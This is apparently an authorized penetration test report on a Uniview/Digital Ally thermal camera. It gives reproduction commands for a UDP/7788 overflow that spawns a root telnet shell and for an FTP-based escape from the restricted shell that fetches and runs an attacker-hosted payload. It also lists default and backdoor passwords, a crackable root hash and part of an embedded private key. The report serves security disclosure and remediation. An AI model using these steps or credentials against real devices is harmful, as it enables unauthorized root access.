# Digital Ally / Uniview OET-213H-NB Security Findings

**Target:** 192.168.30.178
**Device:** Uniview OET-213H-NB (ThermoVu DTM-600)
**Date:** 2025-12-15
**Tester:** Authorized penetration test

---

## Finding 1: Pre-Authentication Remote Code Execution via UDP/7788 (CVE-2021-45039)

**Severity:** CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — **9.8 Critical**

### Description
The device exposes an undocumented UDP service on port 7788 vulnerable to a buffer overflow. Exploitation spawns a telnetd service on port 23 with default root credentials, enabling unauthenticated remote code execution.

### Affected Artifact
- UDP port 7788 on 192.168.30.178
- `<RELEASE_ROOT>/dtm-600/exploit_udp_7788.py`

### Vulnerable Code/Config
```python
# Exploit payload spawns telnetd
DEFAULT_CMD = b";/bin/busybox telnetd -p 23 -l /bin/sh;"
```

### Reproduction Steps
```bash
# 1. Run exploit script
python3 exploit_udp_7788.py -t 192.168.30.178 -c 25 --check

# 2. Connect via telnet
ncat 192.168.30.178 23

# 3. Login with default credentials
# Username: root
# Password: 123456
```

### PoC Confirmed
Yes — telnetd spawned and root shell obtained without any prior authentication.

### Remediation
- Disable UDP/7788 service entirely
- Apply vendor firmware patch if available
- Network segmentation to restrict access to management ports

### Tools Used
- Python 3.x
- ncat (Nmap 7.98)
- expect 5.45

---

## Finding 2: Default Telnet Root Credentials

**Severity:** CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — **9.8 Critical**

### Description
When Telnet is enabled (either via web UI or CVE-2021-45039), the device accepts hardcoded default credentials `root:123456` providing full root shell access.

### Affected Artifact
- Telnet service on port 23
- System authentication

### Credentials
| Username | Password |
|----------|----------|
| root | 123456 |

### Reproduction Steps
```bash
# Connect to telnet
ncat 192.168.30.178 23

# Login
root login: root
Password: 123456

# Result: User@/root> (restricted uvsh shell)
```

### PoC Confirmed
Yes — authenticated as root with default password.

### Remediation
- Change default root password immediately
- Disable telnet; use SSH with key-based authentication
- Implement account lockout after failed attempts

### Tools Used
- ncat (Nmap 7.98)
- expect 5.45

---

## Finding 3: Restricted Shell (uvsh) Escape via updatecpld Command

**Severity:** CVSS 3.1 AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — **8.8 High**

### Description
The restricted `uvsh` shell can be escaped using the `updatecpld` command, which fetches and executes arbitrary code from an attacker-controlled FTP server, providing full unrestricted root shell access.

### Affected Artifact
- `/program/bin/updatecpld.sh`
- Restricted uvsh shell

### Vulnerable Code Flow
```
updatecpld <IP>
    → ftpget anonymous@<IP>/cpldload
    → chmod +x cpldload
    → ./cpldload  (arbitrary code execution)
```

### Reproduction Steps
```bash
# 1. On attacker machine (192.168.30.13), create payload
mkdir -p /tmp/ftp && cat > /tmp/ftp/cpldload << 'EOF'
#!/bin/sh
/bin/busybox sh
EOF
chmod +x /tmp/ftp/cpldload

# 2. Start FTP server
cd /tmp/ftp && python3 -m pyftpdlib -p 21 -w

# 3. From uvsh shell on target
updatecpld 192.168.30.13

# 4. Result: Full root shell
root@root:~$ id
uid=0(root) gid=0(root) groups=0(root)
```

### PoC Confirmed
Yes — escaped from uvsh to full BusyBox ash shell with root privileges.

### Remediation
- Remove or disable updatecpld command
- Restrict FTP client functionality
- Implement code signing for firmware updates

### Tools Used
- pyftpdlib 2.1.0
- ncat (Nmap 7.98)
- expect 5.45

---

## Finding 4: Weak DES Password Hash in /etc/passwd

**Severity:** CVSS 3.1 AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — **7.8 High**

### Description
The root password is stored as a DES crypt hash directly in `/etc/passwd` (no shadow file). DES crypt is cryptographically weak with only 13 characters and can be cracked rapidly.

### Affected Artifact
- `/etc/passwd`

### Vulnerable Code/Config
```
root:6KQ1AHrE6DoCg:0:0::/root:/usr/bin/uvsh
```

### Hash Details
| Field | Value |
|-------|-------|
| Algorithm | DES crypt |
| Hash | 6KQ1AHrE6DoCg |
| Salt | 6K |
| Crackable | Yes (seconds with modern hardware) |

### Reproduction Steps
```bash
# From full root shell
cat /etc/passwd
# Output: root:6KQ1AHrE6DoCg:0:0::/root:/usr/bin/uvsh

# Crack with john
echo "root:6KQ1AHrE6DoCg:0:0::/root:/usr/bin/uvsh" > hash.txt
john --format=descrypt hash.txt
```

### PoC Confirmed
Yes — hash extracted from live system.

### Remediation
- Use modern password hashing (SHA-512/bcrypt/argon2)
- Move password hashes to /etc/shadow with restricted permissions
- Enforce strong password policy

### Tools Used
- BusyBox cat
- john the ripper (for cracking)

---

## Finding 5: Hardcoded Web Admin Credentials (admin/admin)

**Severity:** CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L — **8.8 High**

### Description
The device ships with default web admin credentials stored as an unsalted MD5 hash, with the plaintext password documented in an XML comment.

### Affected Artifact
- `First-boot-Diagnosis-Info/config_all/config/config_a.xml:360`
- Web interface on port 80/81

### Vulnerable Code/Config
```xml
<Device>
    <!-- passwd:admin -->
    <WebLoginPasswd>21232f297a57a5a743894a0e4a801fc3</WebLoginPasswd>
    <WebLoginUserName>admin</WebLoginUserName>
</Device>
```

### Credentials
| Username | Password | MD5 Hash |
|----------|----------|----------|
| admin | admin | 21232f297a57a5a743894a0e4a801fc3 |

### Reproduction Steps
```bash
# Verify hash
echo -n admin | md5sum
# Output: 21232f297a57a5a743894a0e4a801fc3

# Login to web UI
curl -u admin:admin http://192.168.30.178/
```

### PoC Confirmed
Yes — MD5 hash matches "admin" plaintext.

### Remediation
- Force password change on first login
- Use salted modern hashes (bcrypt/argon2)
- Remove plaintext password comments from config

### Tools Used
- md5sum (Darwin 1.0)
- sed (BSD)

---

## Finding 6: Backdoor Super Password

**Severity:** CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L — **8.8 High**

### Description
The device contains a hardcoded "super password" (87654321) that can bypass normal authentication, potentially enabling access to debug/maintenance features including Telnet enablement.

### Affected Artifact
- `First-boot-Diagnosis-Info/config_all/config/config_a.xml:23809`

### Vulnerable Code/Config
```xml
<SuperPwdCfg>
    <Status>0</Status>
    <Passwd>87654321</Passwd>
</SuperPwdCfg>
```

### Reproduction Steps
```bash
# View config
sed -n '23804,23818p' config_a.xml

# Use on web login to access debug features
# Password: 87654321
```

### PoC Confirmed
Yes — plaintext super password found in config.

### Remediation
- Remove master/super password functionality
- Implement per-device randomized recovery codes
- Require physical access for password reset

### Tools Used
- sed (BSD)

---

## Finding 7: Expired and Shared TLS Certificate with Embedded Private Key

**Severity:** CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — **8.6 High**

### Description
The device ships with a shared RSA private key and an HTTPS certificate that expired in 2021, enabling decryption of traffic, spoofing, and man-in-the-middle attacks.

### Affected Artifact
- `First-boot-Diagnosis-Info/config_all/config/ssl_cert.pem`

### Certificate Details
| Field | Value |
|-------|-------|
| Subject | CN=cn.uniview.com, O=uniview, ST=ZheJiang, C=CN |
| Issuer | CN=cn.uniview.com, O=uniview, L=HangZhou |
| Not Before | Aug 28 08:20:22 2018 GMT |
| Not After | Aug 27 08:20:22 2021 GMT |
| Key Type | RSA (private key included) |

### Vulnerable Code/Config
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAuwNop9k9Zm33fm79vi5D9DDdid7WuJlpoO1k9BCBHCoaegmn
CwbK6WfKzyGjCwuue3OrTmsG1E6zK3uLbqdH3r2TvDvSlNH9p1bGrebHtGx9c1aF
...
```

### Reproduction Steps
```bash
openssl x509 -in ssl_cert.pem -noout -subject -issuer -dates
# Shows expired certificate with shared key
```

### PoC Confirmed
Yes — private key and expired cert extracted.

### Remediation
- Generate unique per-device keypairs during manufacturing
- Store private keys in hardware security module or secure storage
- Implement certificate rotation and validity checking

### Tools Used
- LibreSSL 3.3.6

---

## Finding 8: Additional Hardcoded Credentials

**Severity:** CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — **7.4-8.2 High**

### Description
Multiple additional hardcoded credentials found in device configuration.

### Credentials Found

| Location | Username | Password | Purpose |
|----------|----------|----------|---------|
| config_a.xml:21702 | admin | 12345 | PTZ/BoxDome integration |
| config_a.xml:65 | - | 12345678 | WiFi AP Key |
| config_a.xml:802 | - | nullpassword | YJ NAS uplink |
| default_cfg.xml:24 | user | admin (MD5) | PPPoE |

### Reproduction Steps
```bash
sed -n '21700,21734p' config_a.xml  # PTZ creds
sed -n '64,79p' config_a.xml        # WiFi key
sed -n '792,808p' config_a.xml      # NAS password
```

### PoC Confirmed
Yes — all credentials present in plaintext or weak hashes.

### Remediation
- Remove all default credentials
- Require credential configuration during initial setup
- Reject known-weak passwords

### Tools Used
- sed (BSD)

---

## System Information

### Device Details
| Field | Value |
|-------|-------|
| Model | OET-213H-NB-WH |
| Manufacturer | Zhejiang Uniview Technologies |
| Rebrand | Digital Ally ThermoVu DTM-600 |
| Kernel | Linux 4.9.37 armv7l |
| SoC | HiSilicon Hi3516CV500 |
| MAC | E4:F1:4C:25:D7:B2 |

### Open Ports
| Port | Service | Protocol |
|------|---------|----------|
| 23 | telnetd | TCP |
| 80 | HTTP (web UI) | TCP |
| 81 | ONVIF | TCP |
| 554 | RTSP | TCP |
| 7788 | Undocumented (vuln) | UDP |
| 20202 | mmi_client | TCP |

### Attack Chain Summary
```
UDP/7788 Overflow (CVE-2021-45039)
              │
              ▼
     Spawn telnetd :23
              │
              ▼
   Default creds root/123456
              │
              ▼
    Restricted uvsh shell
              │
              ▼
   updatecpld FTP escape
              │
              ▼
     Full root shell
              │
              ▼
   Complete device compromise
```

---

## References

- [SSD Advisory - Uniview IPC2322LB Auth Bypass and CLI Escape](https://ssd-disclosure.com/ssd-advisory-uniview-ipc2322lb-auth-bypass-and-cli-escape/)
- [Uniview Default Password - SecurityCamCenter](https://securitycamcenter.com/uniview-default-password/)
- [CVE-2021-45039 - Uniview UDP Overflow](https://nvd.nist.gov/vuln/detail/CVE-2021-45039)
